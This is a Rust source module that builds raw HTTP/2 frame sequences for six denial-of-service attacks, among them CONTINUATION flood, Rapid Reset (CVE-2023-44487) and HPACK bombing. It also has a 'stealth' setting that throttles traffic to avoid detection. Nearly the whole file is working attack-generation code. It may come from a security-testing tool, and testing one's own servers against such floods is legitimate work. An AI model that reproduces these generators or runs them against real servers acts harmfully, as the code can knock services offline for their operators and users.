use crate::stealth_config::StealthConfig;
use serde::{Deserialize, Serialize};

/// HTTP/2 frame type identifiers per RFC 7540 §6.
const FRAME_TYPE_DATA: u8 = 0x0;
const FRAME_TYPE_HEADERS: u8 = 0x1;
const FRAME_TYPE_RST_STREAM: u8 = 0x3;
const FRAME_TYPE_SETTINGS: u8 = 0x4;
const FRAME_TYPE_PING: u8 = 0x6;
const FRAME_TYPE_CONTINUATION: u8 = 0x9;

/// HTTP/2 frame flags.
const FLAG_END_HEADERS: u8 = 0x4;

/// HTTP/2 frame header length is always 9 bytes.
const FRAME_HEADER_LEN: usize = 9;

/// HTTP/2 error codes for RST_STREAM.
const ERROR_CANCEL: u32 = 0x8;

/// HTTP/2 SETTINGS parameter identifiers.
const SETTINGS_HEADER_TABLE_SIZE: u16 = 0x1;
const SETTINGS_MAX_CONCURRENT_STREAMS: u16 = 0x3;
const SETTINGS_INITIAL_WINDOW_SIZE: u16 = 0x4;
const SETTINGS_MAX_HEADER_LIST_SIZE: u16 = 0x6;

/// Categories of HTTP/2 protocol-level attacks.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum H2AttackType {
    ContinuationFlood,
    RapidReset,
    SettingsFlood,
    PingFlood,
    EmptyFrames,
    HpackBombing,
}

impl std::fmt::Display for H2AttackType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::ContinuationFlood => write!(f, "CONTINUATION Flood"),
            Self::RapidReset => write!(f, "Rapid Reset (CVE-2023-44487)"),
            Self::SettingsFlood => write!(f, "SETTINGS Flood"),
            Self::PingFlood => write!(f, "PING Flood"),
            Self::EmptyFrames => write!(f, "Empty Frames"),
            Self::HpackBombing => write!(f, "HPACK Bombing"),
        }
    }
}

/// Configures intensity and shaping for H2 protocol attack generation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct H2AttackConfig {
    pub frame_count: u32,
    pub stream_id_start: u32,
    pub concurrency: u16,
    pub payload_size: usize,
    pub stealth: Option<StealthConfig>,
}

impl Default for H2AttackConfig {
    fn default() -> Self {
        Self {
            frame_count: 1000,
            stream_id_start: 1,
            concurrency: 10,
            payload_size: 256,
            stealth: None,
        }
    }
}

impl H2AttackConfig {
    pub fn with_frame_count(mut self, count: u32) -> Self {
        self.frame_count = count;
        self
    }

    pub fn with_stream_id_start(mut self, id: u32) -> Self {
        self.stream_id_start = id;
        self
    }

    pub fn with_concurrency(mut self, c: u16) -> Self {
        self.concurrency = c;
        self
    }

    pub fn with_payload_size(mut self, size: usize) -> Self {
        self.payload_size = size;
        self
    }

    pub fn with_stealth(mut self, stealth: StealthConfig) -> Self {
        self.stealth = Some(stealth);
        self
    }

    /// Effective frame count after stealth throttling.
    /// Paranoid stealth reduces frame count to 10% to stay under radar.
    /// Aggressive keeps 60%. Default keeps 40%.
    fn effective_frame_count(&self) -> u32 {
        match &self.stealth {
            None => self.frame_count,
            Some(s) if s.max_requests_per_second <= 2.0 => (self.frame_count / 10).max(1),
            Some(s) if s.max_requests_per_second >= 50.0 => {
                ((self.frame_count as f64 * 0.6) as u32).max(1)
            }
            Some(_) => ((self.frame_count as f64 * 0.4) as u32).max(1),
        }
    }

    /// Inter-frame delay in microseconds derived from stealth config.
    pub fn inter_frame_delay_us(&self) -> u64 {
        match &self.stealth {
            None => 0,
            Some(s) => {
                if s.max_requests_per_second <= 0.0 {
                    return 0;
                }
                (1_000_000.0 / s.max_requests_per_second) as u64
            }
        }
    }
}

/// A generated sequence of raw H2 frame bytes plus metadata.
#[derive(Debug, Clone)]
pub struct H2AttackPayload {
    pub attack_type: H2AttackType,
    pub frames: Vec<Vec<u8>>,
    pub total_bytes: usize,
    pub description: String,
    pub inter_frame_delay_us: u64,
}

impl H2AttackPayload {
    /// Validate that every frame in the payload has a structurally valid H2 frame header.
    pub fn validate_frame_headers(&self) -> bool {
        self.frames.iter().all(|frame| {
            if frame.len() < FRAME_HEADER_LEN {
                return false;
            }
            let declared_len =
                ((frame[0] as usize) << 16) | ((frame[1] as usize) << 8) | (frame[2] as usize);
            frame.len() == FRAME_HEADER_LEN + declared_len
        })
    }
}

/// Encode a 9-byte HTTP/2 frame header.
fn encode_frame_header(length: u32, frame_type: u8, flags: u8, stream_id: u32) -> [u8; 9] {
    let mut header = [0u8; 9];
    header[0] = ((length >> 16) & 0xFF) as u8;
    header[1] = ((length >> 8) & 0xFF) as u8;
    header[2] = (length & 0xFF) as u8;
    header[3] = frame_type;
    header[4] = flags;
    let sid = stream_id & 0x7FFF_FFFF;
    header[5] = ((sid >> 24) & 0xFF) as u8;
    header[6] = ((sid >> 16) & 0xFF) as u8;
    header[7] = ((sid >> 8) & 0xFF) as u8;
    header[8] = (sid & 0xFF) as u8;
    header
}

/// Build a complete frame: header + payload bytes.
fn build_frame(frame_type: u8, flags: u8, stream_id: u32, payload: &[u8]) -> Vec<u8> {
    let header = encode_frame_header(payload.len() as u32, frame_type, flags, stream_id);
    let mut frame = Vec::with_capacity(FRAME_HEADER_LEN + payload.len());
    frame.extend_from_slice(&header);
    frame.extend_from_slice(payload);
    frame
}

/// Parse the frame type byte from a raw frame.
pub fn parse_frame_type(frame: &[u8]) -> Option<u8> {
    if frame.len() < FRAME_HEADER_LEN {
        return None;
    }
    Some(frame[3])
}

/// Parse stream ID from a raw frame.
pub fn parse_stream_id(frame: &[u8]) -> Option<u32> {
    if frame.len() < FRAME_HEADER_LEN {
        return None;
    }
    let sid = ((frame[5] as u32) << 24)
        | ((frame[6] as u32) << 16)
        | ((frame[7] as u32) << 8)
        | (frame[8] as u32);
    Some(sid & 0x7FFF_FFFF)
}

/// Parse flags byte from a raw frame.
pub fn parse_frame_flags(frame: &[u8]) -> Option<u8> {
    if frame.len() < FRAME_HEADER_LEN {
        return None;
    }
    Some(frame[4])
}

/// Parse declared payload length from frame header.
pub fn parse_payload_length(frame: &[u8]) -> Option<usize> {
    if frame.len() < FRAME_HEADER_LEN {
        return None;
    }
    let len = ((frame[0] as usize) << 16) | ((frame[1] as usize) << 8) | (frame[2] as usize);
    Some(len)
}

/// Generate CONTINUATION flood frames (2024 attack technique).
///
/// Sends an initial HEADERS frame WITHOUT END_HEADERS, followed by many
/// CONTINUATION frames also without END_HEADERS. Servers that buffer the
/// entire header block in memory before processing exhaust RAM.
pub fn generate_continuation_flood(config: &H2AttackConfig) -> H2AttackPayload {
    let count = config.effective_frame_count();
    let stream_id = config.stream_id_start;
    let mut frames = Vec::with_capacity(count as usize + 1);

    let header_payload = vec![0x82; config.payload_size.max(1)];
    frames.push(build_frame(
        FRAME_TYPE_HEADERS,
        0,
        stream_id,
        &header_payload,
    ));

    for _ in 0..count {
        let continuation_payload = vec![0x80; config.payload_size.max(1)];
        frames.push(build_frame(
            FRAME_TYPE_CONTINUATION,
            0,
            stream_id,
            &continuation_payload,
        ));
    }

    let total_bytes = frames.iter().map(|f| f.len()).sum();
    H2AttackPayload {
        attack_type: H2AttackType::ContinuationFlood,
        frames,
        total_bytes,
        description: format!(
            "CONTINUATION flood: 1 HEADERS + {} CONTINUATION frames without END_HEADERS on stream {}",
            count, stream_id
        ),
        inter_frame_delay_us: config.inter_frame_delay_us(),
    }
}

/// Generate Rapid Reset attack frames (CVE-2023-44487).
///
/// For each stream: send HEADERS with END_HEADERS, then immediately
/// RST_STREAM with CANCEL. This forces the server to allocate resources
/// per-stream then tear them down, overwhelming the state machine.
pub fn generate_rapid_reset(config: &H2AttackConfig) -> H2AttackPayload {
    let count = config.effective_frame_count();
    let mut frames = Vec::with_capacity(count as usize * 2);

    for i in 0..count {
        let stream_id = config.stream_id_start + (i * 2);
        let sid = stream_id | 1;

        let header_payload = vec![0x82, 0x86, 0x84];
        frames.push(build_frame(
            FRAME_TYPE_HEADERS,
            FLAG_END_HEADERS,
            sid,
            &header_payload,
        ));

        let rst_payload = ERROR_CANCEL.to_be_bytes();
        frames.push(build_frame(FRAME_TYPE_RST_STREAM, 0, sid, &rst_payload));
    }

    let total_bytes = frames.iter().map(|f| f.len()).sum();
    H2AttackPayload {
        attack_type: H2AttackType::RapidReset,
        frames,
        total_bytes,
        description: format!(
            "Rapid Reset: {} HEADERS+RST_STREAM pairs starting at stream {}",
            count, config.stream_id_start
        ),
        inter_frame_delay_us: config.inter_frame_delay_us(),
    }
}

/// Generate SETTINGS flood frames.
///
/// Each SETTINGS frame carries multiple parameters. Servers must process
/// and acknowledge each one; a flood of these saturates the connection.
pub fn generate_settings_flood(config: &H2AttackConfig) -> H2AttackPayload {
    let count = config.effective_frame_count();
    let mut frames = Vec::with_capacity(count as usize);

    let params: [(u16, u32); 4] = [
        (SETTINGS_HEADER_TABLE_SIZE, 65536),
        (SETTINGS_MAX_CONCURRENT_STREAMS, 1000),
        (SETTINGS_INITIAL_WINDOW_SIZE, 2_147_483_647),
        (SETTINGS_MAX_HEADER_LIST_SIZE, 16_777_215),
    ];

    for _ in 0..count {
        let mut payload = Vec::with_capacity(params.len() * 6);
        for (id, val) in &params {
            payload.extend_from_slice(&id.to_be_bytes());
            payload.extend_from_slice(&val.to_be_bytes());
        }
        frames.push(build_frame(FRAME_TYPE_SETTINGS, 0, 0, &payload));
    }

    let total_bytes = frames.iter().map(|f| f.len()).sum();
    H2AttackPayload {
        attack_type: H2AttackType::SettingsFlood,
        frames,
        total_bytes,
        description: format!(
            "SETTINGS flood: {} frames with {} parameters each",
            count,
            params.len()
        ),
        inter_frame_delay_us: config.inter_frame_delay_us(),
    }
}

/// Generate PING flood frames.
///
/// PING frames require servers to respond with PING ACK. A flood of these
/// forces the server into a tight respond loop, consuming CPU and bandwidth.
pub fn generate_ping_flood(config: &H2AttackConfig) -> H2AttackPayload {
    let count = config.effective_frame_count();
    let mut frames = Vec::with_capacity(count as usize);

    for i in 0..count {
        let mut opaque_data = [0u8; 8];
        let bytes = i.to_be_bytes();
        opaque_data[4..8].copy_from_slice(&bytes);
        frames.push(build_frame(FRAME_TYPE_PING, 0, 0, &opaque_data));
    }

    let total_bytes = frames.iter().map(|f| f.len()).sum();
    H2AttackPayload {
        attack_type: H2AttackType::PingFlood,
        frames,
        total_bytes,
        description: format!("PING flood: {} PING frames with unique opaque data", count),
        inter_frame_delay_us: config.inter_frame_delay_us(),
    }
}

/// Generate empty DATA frames attack.
///
/// Zero-length DATA frames are technically valid but force servers to
/// process frame headers and run per-frame logic with no useful work.
pub fn generate_empty_frames(config: &H2AttackConfig) -> H2AttackPayload {
    let count = config.effective_frame_count();
    let stream_id = config.stream_id_start | 1;
    let mut frames = Vec::with_capacity(count as usize + 1);

    let header_payload = vec![0x82, 0x86, 0x84];
    frames.push(build_frame(
        FRAME_TYPE_HEADERS,
        FLAG_END_HEADERS,
        stream_id,
        &header_payload,
    ));

    for _ in 0..count {
        frames.push(build_frame(FRAME_TYPE_DATA, 0, stream_id, &[]));
    }

    let total_bytes = frames.iter().map(|f| f.len()).sum();
    H2AttackPayload {
        attack_type: H2AttackType::EmptyFrames,
        frames,
        total_bytes,
        description: format!(
            "Empty frames: {} zero-length DATA frames on stream {}",
            count, stream_id
        ),
        inter_frame_delay_us: config.inter_frame_delay_us(),
    }
}

/// Generate HPACK bombing headers payload.
///
/// Crafts HEADERS + CONTINUATION frames containing highly compressible
/// header data that expands dramatically on decompression. Uses repeated
/// indexed references and long literal values.
pub fn generate_hpack_bombing(config: &H2AttackConfig) -> H2AttackPayload {
    let count = config.effective_frame_count();
    let stream_id = config.stream_id_start | 1;
    let mut frames = Vec::with_capacity(count as usize + 1);

    let bomb_payload = build_hpack_bomb(config.payload_size.max(64));
    frames.push(build_frame(FRAME_TYPE_HEADERS, 0, stream_id, &bomb_payload));

    for _ in 0..count.saturating_sub(1) {
        let continuation_bomb = build_hpack_bomb(config.payload_size.max(64));
        frames.push(build_frame(
            FRAME_TYPE_CONTINUATION,
            0,
            stream_id,
            &continuation_bomb,
        ));
    }

    if let Some(last) = frames.last_mut()
        && last.len() >= FRAME_HEADER_LEN
    {
        last[4] |= FLAG_END_HEADERS;
    }

    let total_bytes = frames.iter().map(|f| f.len()).sum();
    let frame_count_actual = frames.len();
    H2AttackPayload {
        attack_type: H2AttackType::HpackBombing,
        frames,
        total_bytes,
        description: format!(
            "HPACK bombing: {} frames with expanding header data on stream {}",
            frame_count_actual, stream_id
        ),
        inter_frame_delay_us: config.inter_frame_delay_us(),
    }
}

/// Build a synthetic HPACK-like payload that references dynamic table
/// entries with incremental indexing, forcing large allocations on decode.
///
/// Format: literal header with incremental indexing (0x40) + name length +
/// repeated name bytes + value length + repeated value bytes.
fn build_hpack_bomb(size: usize) -> Vec<u8> {
    let mut payload = Vec::with_capacity(size);
    let name = b"x-bomb-header";
    let value_len = size.saturating_sub(name.len() + 4).max(1);

    payload.push(0x40);
    payload.push(name.len() as u8);
    payload.extend_from_slice(name);

    if value_len < 127 {
        payload.push(value_len as u8);
    } else {
        payload.push(127);
        let mut remaining = value_len - 127;
        while remaining >= 128 {
            payload.push(((remaining % 128) as u8) | 0x80);
            remaining /= 128;
        }
        payload.push(remaining as u8);
    }

    payload.resize(payload.len() + value_len, b'A');
    payload
}

/// Generate attack payloads for all six attack types with the same config.
pub fn generate_all_attacks(config: &H2AttackConfig) -> Vec<H2AttackPayload> {
    vec![
        generate_continuation_flood(config),
        generate_rapid_reset(config),
        generate_settings_flood(config),
        generate_ping_flood(config),
        generate_empty_frames(config),
        generate_hpack_bombing(config),
    ]
}

/// Convenience: generate a single attack type with the given config.
pub fn generate_attack(attack_type: H2AttackType, config: &H2AttackConfig) -> H2AttackPayload {
    match attack_type {
        H2AttackType::ContinuationFlood => generate_continuation_flood(config),
        H2AttackType::RapidReset => generate_rapid_reset(config),
        H2AttackType::SettingsFlood => generate_settings_flood(config),
        H2AttackType::PingFlood => generate_ping_flood(config),
        H2AttackType::EmptyFrames => generate_empty_frames(config),
        H2AttackType::HpackBombing => generate_hpack_bombing(config),
    }
}

/// Returns all known H2 attack types.
pub fn all_attack_types() -> Vec<H2AttackType> {
    vec![
        H2AttackType::ContinuationFlood,
        H2AttackType::RapidReset,
        H2AttackType::SettingsFlood,
        H2AttackType::PingFlood,
        H2AttackType::EmptyFrames,
        H2AttackType::HpackBombing,
    ]
}
